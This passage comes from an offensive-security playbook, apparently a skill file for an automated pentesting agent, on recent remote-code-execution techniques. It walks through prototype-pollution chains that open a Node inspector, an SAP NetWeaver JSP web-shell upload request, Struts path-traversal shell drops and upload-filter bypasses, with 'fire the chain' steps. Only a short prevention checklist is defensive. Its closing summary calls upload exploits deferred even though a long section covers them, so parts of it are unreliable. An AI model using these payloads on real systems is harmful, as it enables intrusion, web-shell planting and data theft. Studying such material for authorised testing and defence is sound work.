- **`curl --config <file>`** reads a file with curl directives; `output-dir`, `output`, `header`, `url` are all reachable. Combined with a file-write primitive (from a prior primitive), the attacker writes their own curl config and re-invokes curl to fetch and drop the next-stage payload.
- **`ssh -F <config>`** reads an SSH config with `Host` blocks including `ProxyCommand` and `LocalCommand`. If the attacker controls the config file, the attacker controls what SSH invokes.
- **`tar --files-from=<file>`** reads a file listing archive members. Path traversal in the list reaches out-of-container files; the tar invocation writes them into the archive; the archive is downloaded and read.
- **`docker buildx bake --file <bakefile>`** reads a bake file with per-target Dockerfile shapes; each target may specify RUN commands or reachable base images.
- **`kubectl apply -f <file>`** reads a manifest with pod specs; any pod spec is an arbitrary container spec — a level-2 chain reaches container spawn.

### The discovery method

For every argument-injection primitive found, walk the target tool's help output for `--config`/`--include`/`--file`/`--from`/`-f` shape flags. For each, check whether the attacker's first-order primitive reaches a file-path argument, and whether the attacker controls the file's contents (from a prior primitive). Composite two-primitive chains reach far further than either primitive alone.

## Emerging Stack RCE Expressions — 2024–2026

Novel deployment shapes bring novel primitives. This section is the frontier: Deno, Nest.js / Nuxt, edge-runtime specifics.

### Deno's inherited PP surface

Deno's stated security posture is "no unsandboxed FS/net without a permission flag." GHunter (USENIX 2024) documents 67 universal PP gadgets in Deno v1.37.2, with the per-impact breakdown dominated by **24 privilege-escalation gadgets** (versus Node's 7). The consequence: PP in a Deno app is a *permission-model* bypass — a script running with limited permissions (e.g., `--allow-read=./data`) reaches gadgets that expand its permission grants.

Concrete Deno-specific gadgets from the paper:
- `Object.prototype.path` gadgets that reach outside the `--allow-read` allowlist.
- `Object.prototype.env` gadgets that expose environment variables the script wasn't permitted to read.
- Gadgets that flip HTTP `--allow-net` allowlists to permit arbitrary hosts.

For Deno target assessment: the source-of-pollution enumeration is the same as Node (Lodash-family merges, spread-then-assign patterns); the sink set is different — Deno-specific runtime APIs rather than Node's `child_process`. Load `prototype_pollution` for the source discovery.

### Nest.js — decorator-driven metadata sinks

Nest.js uses TypeScript decorators (`@Body`, `@Query`, `@Param`) that trigger validation-pipeline logic. Two adjacent RCE surfaces:

- **`class-validator` and `class-transformer`** — if the decorator config runs with `enableImplicitConversion: true` and the target class has a `readonly` property that reflection can bypass, prototype pollution in the transform step reaches all downstream logic.
- **Middleware execution via provider tokens** — Nest's DI resolves providers by string tokens; if a controller accepts a provider token from user input and the DI reflection resolves it, arbitrary class instantiation can reach a class whose constructor has RCE-adjacent side effects.

Nest's `@Controller` and `@Injectable` decorators are metadata-driven; a target that dynamically constructs decorators from user input (rare but documented in a few 2024 CVEs) reaches the same class as SSTI — user template = code.

### Nuxt 3 — auto-imports and server routes

Nuxt 3's `server/api/*.ts` files auto-import via file convention; a target with unrestricted upload to the `server/` directory (via a template-editing feature) reaches direct code execution. Not a bug in Nuxt itself, but a common misconfiguration in Nuxt-based CMSs. Load `frameworks/*` for framework-specific security surface (Nuxt's own security posts, Nest.js CVE tree).

### Edge-runtime environments — Vercel Edge Functions, Cloudflare Workers, Deno Deploy

Edge runtimes are stripped-down JavaScript environments — no `child_process`, no filesystem, restricted network. The RCE class is different:

- **`eval` is available** in most edge runtimes despite the "no eval" folklore — Cloudflare Workers permits `eval` unless the deployment's CSP explicitly denies it; Vercel Edge similarly.
- **`Function(str)` is available** and reaches arbitrary JavaScript in the runtime.
- **Prototype pollution reaches in-runtime gadgets** — the child_process gadget doesn't apply, but the require/import gadgets do (edge runtimes support dynamic import in most cases).
- **The impact is the runtime's own privileges** — usually read from a KV store, write to a KV store, respond to HTTP. Impact is bounded but not zero; a KV-store write from an edge function reaches persistence in the KV store's downstream consumers.

The frontier here isn't well-mapped in 2026; expect further CVE-shape work as edge-runtime deployments mature. Load `frameworks/nextjs.md` for the Next.js Edge Runtime specifics.

## CI/CD and Self-Hosted Runner RCE — 2024–2026 Class Fingerprint

Self-hosted CI runners are a class where user-controllable workflow code executes on infrastructure the user isn't supposed to control. The class is well-established across CI vendors; specific CVE anchors from 2024–2026 exist but this pass did not primary-source-verify individual claims — reported here as class-shape fingerprints with version-fingerprint mitigation, not as CVE-tagged findings.

- **GitHub Actions self-hosted runners** — a workflow triggered by an external PR (fork PR, workflow_run) executes runner code from the untrusted branch. If the runner is not ephemeral and not isolated per-workflow, one PR's malicious workflow reaches the next workflow's state — a persistence surface distinct from RCE-on-workflow. The mitigation is ephemeral runners with per-workflow VM/container recreation.
- **GitLab CI runners** — the runner executes `.gitlab-ci.yml` from any branch that pushes; if the runner is shared across projects with different trust levels, a lower-trust project's CI code reaches the runner's shared state.
- **Jenkins agents** — Groovy sandbox escapes historically enabled RCE via `Groovy Script Console` and pipeline scripts; agent-side escapes reach the Jenkins controller. The Groovy sandbox is a moving target (like all sandboxes per TEFuzz).
- **Argo CD** — the Argo CD controller executes Helm charts and Kustomize configs from git repositories; if the git repository is attacker-influenced (either by attacker control or by dependency), the config execution reaches the controller.

The general class fingerprint: any CI/CD component that executes attacker-influenced configuration on infrastructure. Mitigation shape: ephemeral executors, per-workflow isolation, chart signing, admission-controller-shape gating. The RCE-class primitive is the executor's own privileges; downstream chains reach cluster admin via the executor's service-account token — see `rce_advanced_deep`'s container-to-cluster ladder.

## PP-to-RCE Discovery Walk — Source to Sink in Practice

The base file names the universal `child_process` gadget, three `require`/`import` gadgets, and delegates the source-of-pollution to `prototype_pollution`. This section is the frontier operational depth on how a real assessment reaches from a target's dependency graph to a firing PP-to-RCE chain.

### Step 1 — enumerate sources of pollution in the dependency graph

`npm ls` or `yarn list` produces the transitive dependency set. Grep it for known source-of-pollution packages:

- `lodash`, `lodash.merge`, `lodash.mergewith`, `lodash.defaultsdeep` (< 4.17.21 without patches applied) — the classic PP-source family.
- `merge`, `deepmerge` (older versions), `object-assign-deep`, `hoek` (< 6.1.3).
- Form parsers: `qs` (< 6.11.0), `body-parser` (versions that inherited `qs` behavior), `express-formidable`.
- YAML: `js-yaml` (< 3.13.1 for the merge-key class), `yaml` (specific versions).

Each match is a candidate source; whether the source is reachable depends on the application's actual code path (whether the source is invoked with user input).

### Step 2 — verify the source is reachable

Grep the application source for the invocation of each source-shape function with user-derived input:

```
// Lodash merge with user input
_.merge(config, req.body)
_.merge(target, request.body)
_.defaultsDeep({}, userInput)

// qs / body-parser default behavior
app.use(express.urlencoded({ extended: true }))   // uses qs; default admits nested keys

// YAML with untrusted input
yaml.load(userYamlText)                            // js-yaml < 4 admits merge keys
```

Each reachable source becomes an entry-point for pollution. Fire a test pollution payload (`{"__proto__": {"marker": "polluted"}}`) and check whether the pollution took effect (`Object.prototype.marker` becomes `"polluted"` in the process).

### Step 3 — enumerate reachable sinks

For each PP-to-RCE gadget from Silent Spring or GHunter, check whether the application's code path reaches that gadget:

- `child_process.spawn(cmd, args)` — does the app spawn anything downstream? Grep for `spawn(`, `execFile(`, `exec(`.
- `require(<expr>)` where `<expr>` is dynamic and may miss `package.json` — grep for `require(` with a runtime-computed argument.
- `import(<expr>)` for `.mjs` files with unknown source — grep for `import(` with a runtime-computed argument.

### Step 4 — fire the chain

With source and sink both confirmed reachable, fire the chain:

```
POST /api/config
Content-Type: application/json
{"__proto__": {"shell": "node", "env": {"NODE_OPTIONS": "--inspect-brk=0.0.0.0:1337"}}}
```

Then trigger any endpoint that spawns anything downstream; the spawn boots with the inspector open on the attacker-reachable port. Confirmation via `curl http://target:1337/json/version` returning `webSocketDebuggerUrl`.

### The end-to-end assessment shape

The assessment is not "the target has PP" (finding class) — it is "this source of pollution in this codebase reaches this sink in this runtime version and the observable capability transferred is X." Each hop is verified separately; a source without a sink is not RCE; a sink without a source is not exploitable.

## Composite Frontier Chains

Every frontier finding is itself a chain — a primitive lands and escalates. Named-capability routing:

- **Node.js PP source → Universal child_process gadget → V8 inspector attach → in-process JS control** — the Silent Spring end-to-end, applicable to any Node.js target with a source-of-pollution and any downstream spawn without explicit options.
- **Jinja2 unsandboxed render → class-walk chain → `os.popen` → in-band echo** — the two 2026 CVE anchors, applicable to any Python service passing user template text through `Template(content).render()` without SandboxedEnvironment.
- **Container RCE → runc Leaky Vessels (Dockerfile WORKDIR class) → host-file write → cron persistence or authorized_keys append** — CVE-2024-21626, applicable to any deployment on runc < 1.1.12.
- **git-family argument-injection primitive → documented sub-sink (git `--exec`, ssh ProxyCommand, tar `--use-compress-program=`) → sh -c invocation → in-band echo** — the go-git / Gogs / general class, applicable wherever an attacker-controlled string reaches a git-family tool's argv position with a sub-sink flag.
- **Serializable class in the classpath (Sleeping Giants class-fingerprint) → deserialization sink → runtime-polymorphism trampoline → gadget-chain reachability → `Runtime.exec`** — applicable to any Java application with a serialization sink and any classpath composition that admits a gadget-source family.
- **React 19.x RSC → CVE-2025-55182 class fingerprint (mechanism unverified) → pre-auth RCE** — apply the version-fingerprint mitigation; do not overclaim the mechanism until primary-source-verified.

Each chain is a composite of the base file's Testing Methodology hops, routed by named capability across the sibling skills. When you fire a payload that lands, the finding is not "PP → RCE" as a class — it is "this source of pollution reaches this specific gadget in this runtime version, and the observable capability transferred is X, and X escalates to Y via the confirmation ladder rung Z."

## Upload→Exec — Frontier Additions (2024–2026)

Batch-3 identified upload→exec as a gap in the RCE novel frontier ("zero verified claims"). Batch-7 gap-closure pass verified 18 CVEs across three categories — plugin ecosystems, image/document processors, and framework/enterprise stacks — with primary-source NVD JSON persistence at `.zen-batch-artifacts/batch-3-gap-closure-20260929/cve-json/`. The class is neither thin nor speculative — it's actively-exploited-in-the-wild, in some cases with CISA KEV enforcement (CVE-2025-31324 SAP NetWeaver, CVSS 10.0).

The class shape: a request-handling code path that (a) accepts a user-supplied file, (b) writes it to a location the code path or a downstream consumer will execute, load, or process through a code-execution-capable engine. Extension allowlists, MIME sniffing, and magic-byte checks all have documented bypasses.

## Ghostscript dSAFER Sandbox Bypass — CVE-2024-29510 (ITW Exploited)

Primitive: format-string vulnerability in Ghostscript's uniprint device escapes the `-dSAFER` sandbox, enabling arbitrary command execution when Ghostscript processes an attacker-supplied PostScript / EPS file. Ghostscript is delegated to by nearly every server-side image-processing pipeline that handles PDF or PostScript (ImageMagick, Pillow, LibreOffice conversion, PDF-generation services).

**Affected version:** Ghostscript ≤ 10.03.0; fixed 10.03.1. GHSA-r824-gq56-gjgx.

Version-boundary source: `.zen-batch-artifacts/batch-3-gap-closure-20260929/cve-json/CVE-2024-29510.nvd.json`.

**Root cause — format-string in uniprint device:** the uniprint device's PostScript-command-parsing path passed a user-controllable string to a format-string sink. `-dSAFER` was assumed to contain PostScript execution to a sandbox; the format-string bypass reaches outside the sandbox to execute arbitrary commands.

**Delivery vectors:**
1. **Upload endpoint accepting images** — attacker uploads an EPS file disguised as JPEG (magic-byte confusion) or a legitimate `.eps` extension where the server accepts it. Ghostscript delegated for conversion; format-string fires.
2. **PDF-processing service** — upload endpoint accepts PDF; server generates thumbnail/preview via Ghostscript; malicious PostScript embedded in the PDF triggers.
3. **Office-document conversion** — LibreOffice or similar delegates PostScript rendering to Ghostscript; a doc with embedded PostScript triggers.

**Exploitation gate (all-of-N):**
1. Ghostscript version ≤ 10.03.0 on the target.
2. Upload-and-process pipeline reaches Ghostscript for the uploaded content.
3. Uploaded file type accepted (or MIME-sniffed to something Ghostscript processes).
4. The Ghostscript invocation uses (or defaults to) the uniprint device path, or another code path exercising the format-string bug.

**Confirmation methodology:**
1. Fingerprint the image-processing library and its Ghostscript dependency. Common: ImageMagick's `identify -list delegate` shows `ps → gs`. `convert --version` reveals version.
2. Upload a benign PostScript that triggers a distinctive server-side log entry.
3. Upload the CVE-2024-29510 PoC PostScript (public PoCs exist per Codean Labs writeup); observe RCE via OAST callback.

**ITW-exploited status:** Ghostscript CVE-2024-29510 was reported as exploited-in-the-wild per Bleeping Computer (2024-07). Real attackers weaponized it against image-upload workflows across multiple stacks.

**Chain expressions:**
- WordPress plugin upload → Ghostscript → RCE on the WordPress server.
- Enterprise document-conversion service upload → Ghostscript → RCE on the conversion tier.
- SaaS image-upload pipeline → Ghostscript → RCE on shared multi-tenant conversion infrastructure (cross-tenant escalation).

## SAP NetWeaver JSP Web Shell — CVE-2025-31324 (CISA KEV, CVSS 10.0)

Primitive: unauthenticated JSP web-shell upload to `servlet_jsp/irj/root/` on SAP NetWeaver's Visual Composer Metadata Uploader endpoint; JSP compiled and executed by the container on subsequent GET.

**Affected version:** SAP NetWeaver — verify specific product line version at `.zen-batch-artifacts/batch-3-gap-closure-20260929/cve-json/CVE-2025-31324.nvd.json`. GHSA-7w9p-pr7x-mjw2.

**Root cause — Visual Composer Metadata Uploader lacks authentication:** the servlet endpoint accepts POST with a file body, writes to a JSP-loading directory, without authenticating the requester. Any HTTP client can drop a JSP webshell.

**Preconditions:**
1. SAP NetWeaver version in the affected range.
2. Visual Composer module installed (default on many enterprise deployments).
3. Network reachability to the Metadata Uploader endpoint.

**CISA KEV status:** listed as of 2025-05 with active-enforcement deadline. Federal-adjacent assessments treat as high priority.

**Exploitation walkthrough:**
```
POST /developmentserver/metadatauploader HTTP/1.1
Host: target-sap
Content-Type: multipart/form-data; boundary=X
Content-Length: <N>

--X
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

<%@ page import="java.util.*, java.io.*" %>
<% Process p = Runtime.getRuntime().exec(request.getParameter("c")); ... %>
--X--
```
Then `GET /irj/root/shell.jsp?c=id` — RCE.

**Impact:** typically SAP-application-user-shell (moderate on containerized deployments; often full-root on legacy enterprise SAP installs).

**Chain expressions:**
- SAP RCE → SAP data extraction → enterprise business-data disclosure.
- SAP RCE → pivot to internal SAP database instances → mass data exfiltration.

## Apache Struts File Upload Path Traversal — CVE-2024-53677

Primitive: file-upload parameter accepts a filename containing path-traversal sequences (`../`), enabling the write to reach outside the intended upload directory and drop a file into a servlet-loading path.

**Affected version:** Apache Struts ≥ 2.0.0 < 6.4.0; fixed 6.4.0. Version-boundary source: `.zen-batch-artifacts/batch-3-gap-closure-20260929/cve-json/CVE-2024-53677.nvd.json`.

**Root cause — missing filename validation in FileUpload interceptor:** the Struts FileUpload interceptor accepted attacker-supplied filenames without stripping or validating path components. Combined with an app that used the filename directly as the destination path, `..` sequences escaped the upload directory.

**Preconditions:**
1. Struts version in the affected range.
2. Application uses `FileUpload` interceptor with filename-as-path pattern.
3. Writable target directory reachable via `..` from the upload base.

**Confirmation methodology:**
1. Fingerprint Struts version (via response headers, error pages, framework-specific paths).
2. Send a probe upload with `filename="../marker.txt"` in the multipart body; verify the marker lands outside the upload directory.
3. Escalate to JSP webshell drop into the servlet-loading path.

**Chain into RCE:**
- Upload with `filename="../../webapps/ROOT/shell.jsp"` — drops into Tomcat's ROOT webapp.
- GET `/shell.jsp?c=id` → RCE as the Tomcat user.

## Image/Media Processor Upload→Exec — ImageMagick + FFmpeg Cluster

**CVE-2025-57803 (ImageMagick BMP encoder, CVSS 9.8):**
- 32-bit integer overflow in the BMP encoder; triggers on typical upload-and-convert workflows.
- Affected: ImageMagick < 7.1.2-2 and < 6.9.13-28. Fixed 7.1.2-2 / 6.9.13-28.

**CVE-2025-55298 (ImageMagick `InterpretImageFilename` format-string):**
- Format-string via unsanitized user input in filename interpretation.
- Impact: RCE via crafted filename.

**CVE-2026-25797 (ImageMagick PostScript/HTML injection RCE):**
- Additional PostScript-side vulnerability related to Ghostscript delegation (see § Ghostscript dSAFER Sandbox Bypass above).

**CVE-2025-9951 (FFmpeg JPEG2000 heap-buffer-overflow):**
- Heap-buffer-overflow write in `cdef` atom parsing in the JPEG2000 decoder.
- Impact: RCE via crafted JPEG2000 upload.

**Class expression: uploader → image-processor → RCE:**

Any web upload-and-transform pipeline delegating to ImageMagick or FFmpeg is a candidate for this cluster. The specific CVE depends on the target format:
- BMP upload → CVE-2025-57803.
- JPEG2000 upload → CVE-2025-9951.
- Filename-controlled → CVE-2025-55298.
- PostScript-in-PDF → CVE-2026-25797 + CVE-2024-29510.

**Detection:**
- Fingerprint ImageMagick/FFmpeg versions via `X-Powered-By` headers or error pages.
- Upload each candidate format; observe processing behavior.
- Test with intentionally-malformed files (magic-byte confusion) to determine sniffing behavior.

## WordPress Plugin Upload→Exec — 2025 Cluster (6 CVEs)

Plugin-ecosystem CVEs cluster around a shared class: plugin developers implementing custom upload endpoints without inheriting WordPress core's file-validation. Six verified 2025 CVEs:

- **CVE-2025-5746 (Drag and Drop Multiple File Upload Pro / WooCommerce)** — missing file-type validation in `dnd_upload_cf7_upload_chunks()`; unauthenticated RCE.
- **CVE-2025-12682 (Easy Upload Files During Checkout ≤ 2.9.8)** — unauth arbitrary JS/PHP upload.
- **CVE-2025-12352 (Gravity Forms ≤ 2.9.20)** — missing validation in `copy_post_image()`.
- **CVE-2025-2512 (File Away ≤ 3.9.9.0.1)** — unauth arbitrary upload → RCE.
- **CVE-2025-7441 (StoryChief)** — unauth API endpoint → RCE. GHSA-fvp4-h7hv-jq2c.
- **CVE-2025-49387 (Elementor Forms)** — insufficient server-side validation → PHP webshell. GHSA-8qxx-2678-q552.

**Class-generalization:**

WordPress-plugin file-type-validation-missing is a durable class — dozens of instances per year across the plugin ecosystem. The pattern: plugin developer implements a custom upload endpoint (bypassing `wp_handle_upload`); developer relies on client-side or basic MIME check; server accepts PHP filenames that PHP interprets on subsequent access.

**Detection methodology at scale:**
- Enumerate installed plugins via `/wp-json/wp/v2/plugins` (if REST API accessible) or via `/wp-content/plugins/` directory listing (if enabled).
- Match plugin names against the current CVE list.
- For each affected plugin, probe the specific upload endpoint per advisory.

**Chain into full-site compromise:**
- Upload PHP webshell → RCE as `www-data` → read `wp-config.php` for DB credentials → DB access → arbitrary content modification, admin-account creation, or malware distribution.

## Extension-Allowlist Bypass Classes at the Filename Layer

Even when the target validates uploaded file extensions, specific classes bypass the check:

**Class 1 — `FilenameUtils.getExtension()` in Java (CVE-2024-52302 anchor):**

Apache Commons `FilenameUtils.getExtension()` returns the substring after the last `.` — but specific filenames produce unexpected results:
- `file.php.` — extension "" (trailing dot); server may accept as no-extension and save.
- `file.php%20` — depends on URL-decoding; may bypass extension check.
- `file.jsp\\` — Windows path handling; ambiguity.
- Non-ASCII characters that render as `.` in some encodings.

**Class 2 — MIME sniffing bypass:**

Server accepts files by declared MIME type; attacker sends a `.png` file with `Content-Type: image/png` header, but the file bytes begin with `<?php` — server saves the file as `.php` if the extension check is bypassed, and PHP interprets the file on subsequent access.

**Class 3 — Magic-byte spoofing:**

File begins with `GIF89a` (magic bytes for GIF) followed by PHP code. If the validator checks magic bytes but doesn't validate the entire file content, both the extension check and magic-byte check pass; the file executes as PHP.

**Class 4 — Double-extension:**

`shell.jpg.php` — some webservers (Apache with mod_php mishandling) execute the last extension while the app validates the second-to-last. Historical class; still surfaces in specific misconfigured stacks.

**Class 5 — Null-byte truncation (legacy):**

`shell.php%00.jpg` — older PHP truncates on null byte; extension check sees `.jpg`, filesystem write uses `shell.php`. Fixed in modern PHP; still relevant for legacy stacks.

**Class 6 — Windows ADS in upload:**

Upload with filename `shell.php:hidden.jpg` — Windows NTFS creates alternate data stream; the file is accessible as `shell.php`.

**Class 7 — Path-traversal-in-filename:**

Filename `../../etc/cron.d/backdoor` — writes to arbitrary paths (see CVE-2024-53677 above).

**Route to `path_traversal_lfi_rfi_advanced_deep.md § Windows Path Handling` for the Windows-specific expressions.**

## Upload→Exec Class-Generalization

The upload→exec class is durable across stacks and years. The shared pattern:
1. Untrusted user input reaches a file-write operation.
2. Write destination is a location a code-execution engine reads from (web serving directory, template directory, plugin directory, servlet path).
3. Extension/MIME/magic-byte validation is either missing, misconfigured, or bypassable.
4. Downstream code-execution engine loads and processes the written file.

**Recurrence rate:** at least one high-severity upload→exec CVE per quarter across major stacks 2024–2026; plugin-ecosystem instances at 3-6 per month.

**Prevention checklist:**
- Random-name uploads (server generates filename; never uses user input).
- Store uploads outside the web-serving directory; serve via a controlled proxy that adds `Content-Disposition: attachment`.
- Enforce Content-Type at serve time, not upload time.
- Multi-layer validation: extension + magic bytes + full-content inspection.
- Sandboxed image/document processing (containerized delegation).

## Summary

The 2024–2026 RCE frontier clusters at three places: prototype-pollution-to-RCE at runtime scale where every `child_process` spawn without explicit options inherits the universal shell+env gadget; template-escape as a durable class where sandbox is a mitigation, not a boundary; and container-runtime breakout via runc Leaky Vessels with a kernel-side LPE sibling. Java deserialization reframes as a supply-chain reachability property — classpath composition decides, not what the app calls. Deferred to future targeted research: upload→exec chains and the React Server Components CVE-2025-55182 specific mechanism.
